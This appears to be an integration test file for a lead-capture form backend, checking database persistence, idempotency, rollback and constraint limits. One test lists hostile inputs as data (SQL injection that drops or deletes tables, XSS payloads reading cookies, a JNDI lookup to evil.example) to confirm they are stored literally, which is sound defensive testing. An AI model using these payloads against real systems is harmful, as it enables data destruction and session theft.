import fc from 'fast-check';
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { AREAS_OF_EXPERTISE, COMPANY_SIZES } from '#/shared/lead-profile.ts';
import type { OutboxWriter } from '#/modules/lead-capture/application/ports.ts';
import type { SubmitLeadResult } from '#/modules/lead-capture/application/submit-lead.ts';
import { ORIGIN } from '#test/fakes/submit-lead-harness.ts';
import { openTestDatabase, type TestDatabase } from './support/database.ts';
import { FixtureScope, NO_ROWS, countRows, type WorkspaceFixture } from './support/fixtures.ts';
import { createSubmitLeadIntegration } from './support/harness.ts';
import { RandomUuidV7Generator } from './support/uuid-v7.ts';

const UUID = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/;
const PROPERTY_RUNS = 150;
const PROPERTY_TIMEOUT_MS = 120_000;
const ONE_OF_EACH = {
  leads: 1,
  submissions: 1,
  consents: 3,
  activities: 1,
  outbox: 1,
  audit: 1,
} as const;

const ids = new RandomUuidV7Generator();

let db: TestDatabase;
let scope: FixtureScope;
let fixture: WorkspaceFixture;

beforeAll(async () => {
  db = await openTestDatabase();
});

afterAll(async () => {
  await db.close();
});

beforeEach(async () => {
  scope = new FixtureScope(db.admin, ids);
  fixture = await scope.workspace();
});

afterEach(async () => {
  await scope.dispose();
});

function accepted(result: SubmitLeadResult) {
  if (!result.ok) {
    throw new Error(`expected an accepted submission, got ${JSON.stringify(result.error)}`);
  }
  return result.value;
}

describe('AC-LC-01: accepted submission against Postgres', () => {
  it('AC-LC-01: persists 1 lead, 1 submission, 3 consents, 1 activity, 1 outbox event and 1 audit row', async () => {
    const app = createSubmitLeadIntegration(db.app, fixture);

    const { accepted: response, outcome } = accepted(await app.submit());

    expect(outcome).toBe('accepted');
    expect(response.submissionId).toMatch(UUID);
    expect(response.eventId).toMatch(UUID);
    expect(await countRows(db.admin, fixture.workspaceId)).toEqual(ONE_OF_EACH);
    expect(app.dispatch.calls).toHaveLength(1);
  });

  it('AC-LC-01: the rows reference each other and carry no PII where the database forbids it', async () => {
    const app = createSubmitLeadIntegration(db.app, fixture);
    const { accepted: response } = accepted(await app.submit());

    const joined = await db.admin<
      { lead_email: string; purposes: string; payload: unknown; audit_action: string }[]
    >`
      SELECT
        l.email AS lead_email,
        (SELECT string_agg(c.purpose, ',' ORDER BY c.purpose) FROM capture.consents c WHERE c.submission_id = s.id) AS purposes,
        (SELECT o.payload FROM tracking.outbox_events o WHERE o.aggregate_id = l.id) AS payload,
        (SELECT a.action FROM core.audit_log a WHERE a.resource_id = s.id) AS audit_action
      FROM capture.submissions s
      JOIN crm.leads l ON l.workspace_id = s.workspace_id AND l.id = s.lead_id
      WHERE s.id = ${response.submissionId}
    `;

    expect(joined[0]?.lead_email).toBe('maria@empresa.com.br');
    expect(joined[0]?.purposes).toBe('ad_tracking,marketing_communications,privacy_policy');
    expect(Object.keys(joined[0]?.payload as object).sort()).toEqual(['lead_id', 'submission_id']);
    expect(joined[0]?.audit_action).toBe('lead.captured');
  });
});

describe('AC-LC-04: e-mail that already exists', () => {
  it('AC-LC-04: keeps one lead, increments submissions_count and answers with the same shape', async () => {
    const app = createSubmitLeadIntegration(db.app, fixture);

    const first = accepted(await app.submit());
    const second = accepted(await app.submit());

    const lead = await db.admin<{ submissions_count: number; version: number }[]>`
      SELECT submissions_count, version FROM crm.leads WHERE workspace_id = ${fixture.workspaceId}
    `;
    expect(lead).toEqual([{ submissions_count: 2, version: 2 }]);
    expect((await countRows(db.admin, fixture.workspaceId)).leads).toBe(1);
    expect((await countRows(db.admin, fixture.workspaceId)).submissions).toBe(2);
    expect(Object.keys(second.accepted).sort()).toEqual(Object.keys(first.accepted).sort());
    expect(second.accepted.submissionId).not.toBe(first.accepted.submissionId);
  });
});

describe('Idempotency and event id barriers of the database', () => {
  it('AC-LC-09: with Redis down, the UNIQUE (workspace, key) replays the stored response', async () => {
    const app = createSubmitLeadIntegration(db.app, fixture);
    app.idempotency.down = true;
    const command = app.command();

    const first = accepted(await app.submitLead(command));
    const replay = accepted(await app.submitLead(command));

    expect(first.outcome).toBe('accepted');
    expect(replay.outcome).toBe('replayed');
    expect(replay.accepted).toEqual(first.accepted);
    expect(await countRows(db.admin, fixture.workspaceId)).toEqual(ONE_OF_EACH);
  });

  it('AC-LC-10: with Redis down, the same key with another payload is refused', async () => {
    const app = createSubmitLeadIntegration(db.app, fixture);
    app.idempotency.down = true;
    const command = app.command();
    accepted(await app.submitLead(command));

    const reused = await app.submitLead(
      app.command({ company: 'Outra Empresa Ltda' }, { idempotencyKey: command.idempotencyKey }),
    );

    expect(reused).toEqual({ ok: false, error: { code: 'idempotency_key_reused' } });
    expect((await countRows(db.admin, fixture.workspaceId)).submissions).toBe(1);
  });

  it('a Pixel event_id reused under a new key is accepted with a server-generated event id', async () => {
    const app = createSubmitLeadIntegration(db.app, fixture);
    const tracking = { event_id: app.ids.uuidv7() };

    const first = accepted(await app.submit({ tracking }));
    const second = accepted(await app.submit({ tracking }));

    expect(first.accepted.eventId).toBe(tracking.event_id);
    expect(second.accepted.eventId).not.toBe(tracking.event_id);
    expect(await countRows(db.admin, fixture.workspaceId)).toMatchObject({
      leads: 1,
      submissions: 2,
      consents: 6,
      outbox: 2,
      audit: 2,
    });
  });
});

describe('AC-LC-18: a failure inside the transaction rolls everything back', () => {
  it('AC-LC-18: a failing outbox insert leaves no lead, submission, consent, activity or audit row', async () => {
    const failingOutbox: OutboxWriter = {
      enqueue: () => Promise.reject(new Error('outbox unavailable')),
    };
    const app = createSubmitLeadIntegration(db.app, fixture, { outbox: failingOutbox });
    const command = app.command();

    await expect(app.submitLead(command)).rejects.toThrow('outbox unavailable');

    expect(await countRows(db.admin, fixture.workspaceId)).toEqual(NO_ROWS);
    expect(app.idempotency.releases).toHaveLength(1);
    expect(app.dispatch.calls).toHaveLength(0);
  });

  it('AC-LC-18: after the failure the same request succeeds as a first submission', async () => {
    const failingOutbox: OutboxWriter = {
      enqueue: () => Promise.reject(new Error('outbox unavailable')),
    };
    const broken = createSubmitLeadIntegration(db.app, fixture, { outbox: failingOutbox });
    const command = broken.command();
    await expect(broken.submitLead(command)).rejects.toThrow();

    const healthy = createSubmitLeadIntegration(db.app, fixture);
    const result = accepted(await healthy.submitLead(command));

    expect(result.outcome).toBe('accepted');
    expect(await countRows(db.admin, fixture.workspaceId)).toEqual(ONE_OF_EACH);
  });
});

describe('AC-LC-14: hostile payloads are stored literally', () => {
  it('AC-LC-14: SQL injection and XSS in message round-trip byte for byte', async () => {
    const app = createSubmitLeadIntegration(db.app, fixture);
    const payloads = [
      "'); DROP TABLE crm.leads; --",
      "Robert'); DELETE FROM capture.consents WHERE ('1'='1",
      '<script>alert(document.cookie)</script>',
      '"><img src=x onerror=alert(1)>',
      '${jndi:ldap://evil.example/a} $$ \\ %s',
    ];

    const stored: string[] = [];
    for (const message of payloads) {
      const { accepted: response } = accepted(await app.submit({ message }));
      const rows = await db.admin<{ message: string }[]>`
        SELECT message FROM capture.submissions WHERE id = ${response.submissionId}
      `;
      stored.push(rows[0]?.message ?? '');
    }

    expect(stored).toEqual(payloads);
    expect((await countRows(db.admin, fixture.workspaceId)).leads).toBe(1);
    expect((await countRows(db.admin, fixture.workspaceId)).submissions).toBe(payloads.length);
  });

  it('AC-LC-14: markup in first_name is refused before it reaches the database', async () => {
    const app = createSubmitLeadIntegration(db.app, fixture);

    const result = await app.submit({ first_name: '<script>alert(1)</script>' });

    expect(result.ok).toBe(false);
    expect(await countRows(db.admin, fixture.workspaceId)).toEqual(NO_ROWS);
  });
});

describe('AC-LC-13 (database half): accepted values satisfy the CHECK constraints', () => {
  const repeat = (unit: string, length: number): string => unit.repeat(length).slice(0, length);

  it('AC-LC-13: values at the exact limits of every rule are stored', async () => {
    const app = createSubmitLeadIntegration(db.app, fixture);
    const longLocalPart = repeat('a', 64);
    const domain = `${repeat('b', 60)}.${repeat('c', 60)}.${repeat('d', 60)}.com`;

    const { accepted: response } = accepted(
      await app.submit(
        {
          first_name: repeat('a', 60),
          last_name: repeat('b', 80),
          email: `${longLocalPart}@${domain}`,
          company: repeat('c', 120),
          area_of_expertise: 'other',
          area_of_expertise_other: repeat('d', 80),
          job_title: repeat('e', 100),
          company_size: '1000_plus',
          company_website: `https://empresa.com.br/${repeat('p', 200 - 'https://empresa.com.br/'.length)}`,
          message: repeat('m', 1000),
          tracking: {
            event_id: app.ids.uuidv7(),
            utm_source: repeat('s', 150),
            utm_medium: repeat('m', 150),
            utm_campaign: repeat('c', 150),
            utm_term: repeat('t', 150),
            utm_content: repeat('n', 150),
            utm_id: repeat('i', 150),
            gclid: repeat('g', 500),
            gbraid: repeat('b', 500),
            wbraid: repeat('w', 500),
            fbclid: repeat('f', 500),
            ttclid: repeat('t', 500),
            msclkid: repeat('m', 500),
            fbp: `fb.1.1730600000000.${repeat('x', 500 - 'fb.1.1730600000000.'.length)}`,
            fbc: `fb.1.1730600000000.${repeat('y', 500 - 'fb.1.1730600000000.'.length)}`,
            ga_client_id: `123456789.${repeat('1', 100 - '123456789.'.length)}`,
            landing_page_url: `${ORIGIN}/?x=${repeat('l', 2000 - `${ORIGIN}/?x=`.length)}`,
            referrer_url: `https://l.facebook.com/?r=${repeat('r', 2000 - 'https://l.facebook.com/?r='.length)}`,
          },
        },
        { userAgent: repeat('u', 600) },
      ),
    );

    const stored = await db.admin<{ user_agent: string; message: string }[]>`
      SELECT user_agent, message FROM capture.submissions WHERE id = ${response.submissionId}
    `;
    expect(stored[0]?.user_agent).toHaveLength(512);
    expect(stored[0]?.message).toHaveLength(1000);
    expect(await countRows(db.admin, fixture.workspaceId)).toEqual(ONE_OF_EACH);
  });

  it(
    'AC-LC-13: every body the validator accepts is inserted without violating a CHECK',
    async () => {
      const app = createSubmitLeadIntegration(db.app, fixture);
      let persisted = 0;

      await fc.assert(
        fc.asyncProperty(bodyArbitrary(fixture.formKey), async (body) => {
          const result = await app.submitLead(app.command(body));
          if (result.ok && result.value.outcome === 'accepted') {
            persisted += 1;
          }
        }),
        { numRuns: PROPERTY_RUNS },
      );

      expect(persisted).toBeGreaterThan(0);
      expect((await countRows(db.admin, fixture.workspaceId)).submissions).toBe(persisted);
    },
    PROPERTY_TIMEOUT_MS,
  );
});

/** Mostly plausible values (so many bodies are accepted), sometimes arbitrary noise. */
function bodyArbitrary(formKey: string): fc.Arbitrary<Record<string, unknown>> {
  const anyText = fc.oneof(
    fc.string({ unit: 'binary', maxLength: 140 }),
    fc.string({ unit: 'grapheme', maxLength: 70 }),
  );
  const noise = fc.oneof(anyText, fc.anything());
  const mostly = <T>(valid: fc.Arbitrary<T>, other: fc.Arbitrary<unknown> = noise) =>
    fc.oneof({ weight: 6, arbitrary: valid }, { weight: 1, arbitrary: other });
  const optional = <T>(arbitrary: fc.Arbitrary<T>) => fc.option(arbitrary, { nil: undefined });

  return fc.record(
    {
      form_key: fc.constant(formKey),
      turnstile_token: fc.constant('0.AbCdEf'),
      first_name: mostly(fc.constantFrom('Maria', "João D'Ávila-Souza", 'Zoë')),
      last_name: mostly(fc.constantFrom('Silva', 'de Oliveira')),
      email: mostly(
        fc.constantFrom('maria@empresa.com.br', 'Joao.Silva+crm@Gmail.com', 'ana@loja.io'),
        fc.oneof(anyText, fc.emailAddress()),
      ),
      whatsapp: mostly(fc.constantFrom('11912345678', '+55 (21) 98888-7777', '+1 415 555 2671')),
      company: mostly(fc.constantFrom('Empresa Ltda', 'A&B (Brasil) S/A')),
      area_of_expertise: mostly(fc.constantFrom(...AREAS_OF_EXPERTISE)),
      area_of_expertise_other: optional(mostly(fc.constantFrom('Gestão de frotas'))),
      job_title: optional(mostly(fc.constantFrom('Head de Marketing', 'CEO'))),
      company_size: optional(mostly(fc.constantFrom(...COMPANY_SIZES))),
      company_website: optional(mostly(fc.constantFrom('empresa.com.br', 'https://x.io/a?b=1'))),
      message: optional(
        mostly(fc.constantFrom('Preciso de ajuda\r\ncom o CRM', 'Olá', "O'Neil; --")),
      ),
      marketing_opt_in: optional(mostly(fc.boolean())),
      privacy_consent: mostly(fc.constant(true)),
      hp: optional(
        fc.oneof({ weight: 12, arbitrary: fc.constant('') }, { weight: 1, arbitrary: anyText }),
      ),
      consent: optional(
        mostly(
          fc.record(
            {
              ad_storage: fc.constantFrom('granted', 'denied'),
              ad_user_data: mostly(fc.constant('granted')),
            },
            { requiredKeys: [] },
          ),
        ),
      ),
      tracking: optional(
        mostly(
          fc.record(
            {
              event_id: mostly(fc.uuid()),
              utm_source: mostly(fc.constantFrom('meta', 'google ads')),
              gclid: mostly(fc.constantFrom('Cj0KCQ_abc-123~x')),
              fbp: mostly(fc.constantFrom('fb.1.1730600000000.123456789')),
              landing_page_url: mostly(fc.constantFrom(`${ORIGIN}/?a=1`, 'https://evil.example/')),
              referrer_url: mostly(fc.constantFrom('https://l.facebook.com/')),
            },
            { requiredKeys: [] },
          ),
        ),
      ),
    },
    { requiredKeys: ['form_key', 'turnstile_token'] },
  );
}
